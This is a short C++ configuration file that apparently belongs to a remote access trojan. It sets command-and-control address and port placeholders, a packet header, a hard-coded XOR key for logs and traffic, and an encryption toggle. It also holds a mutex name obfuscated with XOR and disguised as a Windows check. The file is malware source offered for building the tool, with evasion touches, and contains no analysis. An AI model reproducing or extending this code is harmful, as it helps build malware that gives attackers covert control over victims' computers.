#include "settings.hpp"

namespace Settings {
    // C2 Information
    std::string C2_IP_ADDRESS = RAT_C2_IP_ADDRESS;
    std::string C2_PORT = RAT_C2_PORT;

    // Packet Information
    std::string HEADER = RAT_PACKET_HEADER;

    // XOR key for log/comms
    std::vector<unsigned char> key = {
        0x0F, 0x00, 0x00, 0x0D
    };

    // toggle comms encryption
    bool ENCRYPT_COMMS = SetPresetsToggle(RAT_ENCRYPT_COMMS);

    // Mutex name
    std::string MUTEX_NAME = XOR_LIT("Global\\win10x64_check_running_once");

    // convert toggle "ON"/"OFF" to bool
    bool SetPresetsToggle(std::string settingValue)
    {
        if (settingValue == XOR_LIT("ON"))
            return true;
        return false;
    }
}